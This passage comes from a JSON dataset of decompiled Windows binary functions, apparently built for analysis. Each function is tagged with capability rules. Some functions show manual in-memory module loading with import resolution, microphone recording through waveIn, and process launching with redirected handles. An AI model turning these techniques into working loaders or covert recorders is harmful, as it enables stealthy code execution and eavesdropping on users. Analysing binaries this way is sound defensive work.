        "decompiled_code": "\nuint __fastcall fcn.00464c64(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    if (param_2 < -1) {\n        param_2 = -1;\n    }\n    if ((param_2 == -1) || (*(in_EAX + 0xb) != '\\0')) {\n        fcn.00464194();\n        uVar1 = fcn.00464210();\n    }\n    else {\n        uVar1 = 0;\n        fcn.004639f8();\n        arg_8h = auStack16;\n        uVar2 = fcn.00463ad4(arg_8h);\n        if ((uVar2 & 0x80000000) == 0) {\n            *(in_EAX + 0xb) = 0;\n            uVar1 = 1;\n            *(in_EAX + 0x18) = arg_8h;\n            *(in_EAX + 0x1c) = uStack24;\n            *(in_EAX + 0x20) = uStack20;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 292
    },
    "00464d98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464d98(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*0x497f44 != 0) && (*(in_EAX + 5) != '\\0')) {\n        fcn.00464194();\n        fcn.00404650();\n        *0x497f44 = 0;\n        *(in_EAX + 5) = 0;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00464dcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464dcc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x464e3e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*0x497f44 != 0) {\n        fcn.00409d60();\n        fcn.00405864();\n        cVar1 = fcn.00464210();\n        if (cVar1 != '\\0') {\n            *(in_EAX + 5) = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x464e45;\n    uStack28 = 0x464e3d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "00464e58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00464e58(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    puStack28 = 0x464e77;\n    piVar2 = fcn.0042935c();\n    uStack32 = 0x464edf;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*(in_EAX + 5) == '\\0') {\n        puStack28 = &fcn.00464e58::var_1h + 1;\n        fcn.00404f70();\n        return var_1h;\n    }\n    puStack28 = &fcn.00464e58::var_1h + 1;\n    cVar1 = fcn.00464168();\n    if (cVar1 != '\\0') {\n        var_1h._0_1_ = fcn.00464c54();\n        (**(*piVar2 + 0x68))();\n        fcn.0045fde8();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464ee6;\n    uStack32 = 0x464ede;\n    uVar3 = fcn.00404650();\n    return uVar3;\n}\n",
        "token_count": 379
    },
    "00465304": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465304(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint auStack264 [13];\n    int32_t iStack212;\n    \n    puVar4 = auStack264;\n    for (iVar2 = 0x3e; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *param_2;\n        param_2 = param_2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = fcn.004652ac(*param_1);\n    uVar3 = *(*param_1 + 6);\n    if (-1 < uVar3 - 1) {\n        do {\n            if (*(iVar2 + 0x10) == 0) {\n                if (0 < iStack212) {\n                    uVar9 = 4;\n                    uVar8 = 0x1000;\n                    iVar6 = *(iVar2 + 0xc);\n                    uVar7 = 0;\n                    iVar5 = iStack212;\n                    uVar1 = fcn.00465210(iVar6, 0);\n                    uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar1, iVar6, uVar7, iVar5, uVar8, uVar9);\n                    *(iVar6 + 8) = uVar1;\n                    fcn.00403af4();\n                }\n                fcn.004651e0(0x28, 0);\n            }\n            else {\n                uVar10 = 4;\n                uVar9 = 0x1000;\n                uVar1 = *(iVar2 + 0x10);\n                iVar6 = *(iVar2 + 0xc);\n                uVar8 = 0;\n                uVar7 = fcn.00465210(iVar6, 0);\n                uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar7, iVar6, uVar8, uVar1, uVar9, uVar10);\n                iVar5 = 0;\n                fcn.00465210(*(iVar6 + 0x14), 0);\n                fcn.00408550();\n                *(iVar5 + 8) = uVar1;\n                fcn.004651e0(0x28, 0);\n            }\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 600
    },
    "00465408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465408(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar1 = fcn.004652e8();\n    if (puVar1[1] != 0) {\n        piVar2 = fcn.00465210(*puVar1, 0);\n        while (*piVar2 != 0) {\n            fcn.00465210(*piVar2, 0);\n            puVar3 = fcn.00465210(8, 0);\n            iVar4 = fcn.0040345c();\n            do {\n                arg_8h_00 = *puVar3 & 0xfff;\n                if (*puVar3 >> 0xc == 3) {\n                    fcn.00465210(arg_8h_00, 0);\n                    fcn.004651e0(arg_8h_00, 0);\n                }\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            fcn.004651e0(piVar2[1], 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "004654f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004654f4(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t **in_FS_OFFSET;\n    int32_t *in_stack_fffffebc;\n    int32_t *piStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    int32_t hModule;\n    int32_t *lp;\n    uint var_1h;\n    \n    puStack300 = &var_1h + 1;\n    uStack304 = 0x465734;\n    piStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack308;\n    var_1h._0_1_ = 1;\n    puVar3 = fcn.004652e8();\n    if (puVar3[1] != 0) {\n        lp = fcn.00465210(*puVar3, 0);\n        while( true ) {\n            in_stack_fffffebc = lp;\n            iVar7 = sub.kernel32.dll_IsBadReadPtr(lp, 0x14);\n            if ((iVar7 != 0) || (lp[3] == 0)) goto code_r0x0046571b;\n            fcn.00465210(lp[3], 0);\n            uVar4 = fcn.004652a0();\n            hModule = sub.kernel32.dll_LoadLibraryA(uVar4);\n            if (hModule == -1) break;\n            if (*(arg_8h + 8) == 0) {\n                uVar4 = fcn.00402ee8();\n                *(arg_8h + 8) = uVar4;\n            }\n            uVar4 = fcn.00407160(*(arg_8h + 8), (*(arg_8h + 0xc) + 1) * 4);\n            *(arg_8h + 8) = uVar4;\n            if (*(arg_8h + 8) == 0) {\n                fcn.00405584();\n                var_1h._0_1_ = 0;\n                goto code_r0x0046571b;\n            }\n            var_10h = *(arg_8h + 0xc) * 4;\n            fcn.004651e0(var_10h, var_10h >> 0x1f);\n            piVar5 = *(arg_8h + 8);\n            *piVar5 = hModule;\n            piVar5[1] = 0;\n            fcn.004651f8(var_10h, var_10h >> 0x1f);\n            *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n            if (*lp == 0) {\n                piVar5 = fcn.00465210(lp[4], 0);\n            }\n            else {\n                piVar5 = fcn.00465210(*lp, 0);\n            }\n            piVar6 = fcn.00465210(lp[4], 0);\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n                cVar1 = fcn.004652f8();\n                if (cVar1 == '\\0') {\n                    fcn.00465210(*piVar5, 0);\n                    fcn.00408550();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, &var_112h + 2);\n                    *piVar6 = iVar7;\n                }\n                else {\n                    uVar2 = fcn.004652f0();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, uVar2);\n                    *piVar6 = iVar7;\n                }\n                if (*piVar6 == 0) {\n                    fcn.00405584();\n                    var_1h._0_1_ = 0;\n                    break;\n                }\n                piVar6 = piVar6 + 1;\n            }\n            fcn.004651e0(0x14, 0);\n        }\n        fcn.00465210(lp[3], 0);\n        fcn.004652a0();\n        fcn.00405728();\n        fcn.00405864();\n        var_1h._0_1_ = 0;\n    }\ncode_r0x0046571b:\n    *in_FS_OFFSET = in_stack_fffffebc;\n    fcn.00405530(0x46573b);\n    return;\n}\n",
        "token_count": 1068
    },
    "00465d54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00465d54(uint param_1, uint16_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    int32_t iVar5;\n    bool bVar6;\n    uint uVar7;\n    \n    puVar1 = fcn.004652e8(param_2, 0, 0xffffffff);\n    if (puVar1[1] == 0) {\n        uVar7 = 0x465d8e;\n        fcn.00405584();\n    }\n    else {\n        uVar7 = 0;\n        iVar2 = fcn.00465210(*puVar1, 0);\n        if ((*(iVar2 + 0x18) == 0) || (*(iVar2 + 0x14) == 0)) {\n            fcn.00405584();\n        }\n        else {\n            puVar3 = fcn.00465254();\n            fcn.00465254();\n            iVar5 = *(iVar2 + 0x18);\n            do {\n                arg_8h = *puVar3;\n                fcn.00465210(arg_8h, 0);\n                fcn.004652a0();\n                iVar4 = fcn.0040a960();\n                if (iVar4 == 0) {\n                    arg_8h = *param_2;\n                    break;\n                }\n                puVar3 = puVar3 + 1;\n                param_2 = param_2 + 1;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            if (param_2 == 0xffffffff) {\n                fcn.00405584(arg_8h);\n            }\n            else {\n                bVar6 = param_2 < 0;\n                if (-1 < param_2) {\n                    bVar6 = *(iVar2 + 0x14) + -1 < param_2;\n                }\n                if (bVar6) {\n                    fcn.00405584(arg_8h);\n                }\n                else {\n                    fcn.00465210(param_2 * 4, param_2 * 4 >> 0x1f);\n                    puVar1 = fcn.00465254();\n                    fcn.00465210(*puVar1, puVar1[1]);\n                }\n            }\n        }\n    }\n    return uVar7;\n}\n",
        "token_count": 542
    },
    "00465f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00465f94(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_var;\n    \n    if ((in_EAX != NULL) && (*(in_EAX + 4) != '\\0')) {\n        uVar4 = *(*in_EAX + 0x28);\n        uVar6 = 0;\n        pcVar1 = fcn.00465210(uVar4, 0);\n        (*pcVar1)(in_EAX[1], 0, 0, uVar4, uVar6, extraout_var);\n        *(in_EAX + 4) = 0;\n        iVar2 = in_EAX[3];\n        if (-1 < iVar2 + -1) {\n            iVar5 = 0;\n            do {\n                iVar5 = iVar5 * 4;\n                uVar4 = 0x465ff2;\n                fcn.004651e0(iVar5, iVar5 >> 0x1f);\n                bVar3 = in_EAX[2][1] == 0;\n                if (bVar3) {\n                    bVar3 = *in_EAX[2] == -1;\n                }\n                if (!bVar3) {\n                    sub.kernel32.dll_FreeLibrary_1(uVar4);\n                }\n                fcn.004651f8(iVar5, iVar5 >> 0x1f);\n                iVar5 = iVar5 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00407148(in_EAX[2]);\n        if (in_EAX[1] != 0) {\n            sub.kernel32.dll_VirtualFree_1(in_EAX[1], 0, 0x8000);\n        }\n        uVar4 = sub.kernel32.dll_GetProcessHeap(0);\n        sub.kernel32.dll_HeapFree(uVar4);\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "004663cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004663cc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403af4();\n    sub.msacm32.dll_acmStreamConvert(*(in_EAX + 0x104), in_EAX + 0x108, 4);\n    sub.msacm32.dll_acmStreamReset(*(in_EAX + 0x104), 0);\n    *(in_EAX + 0x100) = 0;\n    return *(in_EAX + 300);\n}\n",
        "token_count": 112
    },
    "0046669c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046669c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == '\\0') {\n        *(in_EAX + 0xf8) = param_2;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00466738": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00466738(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x497f50;\n    if (*0x497f54 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x497f50;\n        fcn.004030fc();\n        uVar2 = fcn.00466730();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.00466730();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x497f54;\n            puVar3 = puVar4 + 0xd;\n            *0x497f54 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x497f50 = puVar1;\n    puVar3 = *0x497f54;\n    puVar1 = *0x497f54 + 5;\n    *0x497f54 = *(*0x497f54 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 370
    },
    "004667e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004667e4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x490ad8 = *0x4957f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x490aec, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x490aec, *0x4957f8);\n        }\n        sub.user32.dll_RegisterClassA(0x490ac8);\n    }\n    uVar2 = fcn.0040856c(0, *0x4957f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00466738(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 296
    },
    "00466930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466930(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    int32_t iStack40;\n    uchar *puStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        uStack24 = 0x466a51;\n        fcn.00466c04();\n    }\n    else {\n        uStack24 = 0x20;\n        uStack32 = *(in_EAX + 0x94);\n        puStack36 = 0x46695f;\n        iStack28 = param_2;\n        iVar1 = sub.winmm.dll_waveInUnprepareHeader();\n        if (iVar1 == 0) {\n            uVar2 = *(param_2 + 8);\n            if (*(in_EAX + 0xa2) != 0) {\n                puStack36 = 0x466981;\n                fcn.00402f00();\n                iStack40 = 0x4669cd;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004030fc();\n                (**(in_EAX + 0xa0))();\n                *in_FS_OFFSET = uVar2;\n                iStack40 = 0x4669d4;\n                uStack44 = 0x4669cc;\n                fcn.00402f1c();\n                return;\n            }\n            *(param_2 + 4) = *(in_EAX + 0xc);\n            *(param_2 + 8) = 0;\n            *(param_2 + 0xc) = 0;\n            *(param_2 + 0x10) = 0;\n            *(param_2 + 0x14) = 0;\n            puStack36 = 0x466a12;\n            fcn.00408558();\n            puStack36 = 0x20;\n            uStack44 = *(in_EAX + 0x94);\n            iStack40 = param_2;\n            iVar1 = sub.winmm.dll_waveInPrepareHeader();\n            if (iVar1 == 0) {\n                sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), param_2, 0x20);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "00466a58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466a58(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t aiStack172 [3];\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint auStack144 [33];\n    \n    puVar3 = &stack0xffffff70;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    if (*(in_EAX + 4) == '\\0') {\n        uStack148 = 0x10004;\n        uStack152 = 0;\n        uStack156 = *(in_EAX + 0x98);\n        puStack160 = &stack0xffffff70;\n        aiStack172[2] = 0;\n        aiStack172[1] = in_EAX + 0x94;\n        aiStack172[0] = 0x466a97;\n        iVar1 = sub.winmm.dll_waveInOpen();\n        if (iVar1 == 0) {\n            for (uVar2 = *(in_EAX + 0x91); uVar2 != 0; uVar2 = uVar2 - 1) {\n                aiStack172[0] = 0x466aad;\n                fcn.00466b9c();\n            }\n            aiStack172[0] = *(in_EAX + 0x94);\n            iVar1 = sub.winmm.dll_waveInStart();\n            if (iVar1 == 0) {\n                puVar3 = &stack0xffffff54;\n                puVar4 = in_EAX + 0x10;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                *(in_EAX + 4) = 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00466b38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466b38(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != '\\0') {\n        *(in_EAX + 4) = 0;\n        sub.winmm.dll_waveInReset(*(in_EAX + 0x94));\n        sub.winmm.dll_waveInClose(*(in_EAX + 0x94));\n        *(in_EAX + 0x94) = 0;\n        iVar1 = *(*(in_EAX + 8) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.004661c8();\n                fcn.00466c04();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00466b90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466b90(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00466ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00466ca8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x466cc1;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x466cdb;\n        fcn.0040a918();\n        puStack920 = 0x466ce8;\n        fcn.0040a918();\n        puStack920 = 0x466cf5;\n        fcn.0040a918();\n        uStack924 = 0x466e97;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.00466ca8::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.00466ca8::lpFileName, 0xc0000000, 3, &fcn.00466ca8::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.00466ca8::var_323h, 0xc0000000, 3, &fcn.00466ca8::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.00466ca8::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.00466ca8::var_368h, \n                                   &fcn.00466ca8::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x466e9e);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1044
    },
    "00466f48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00466f48(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar *var_68h;\n    uint *var_64h;\n    uint32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint 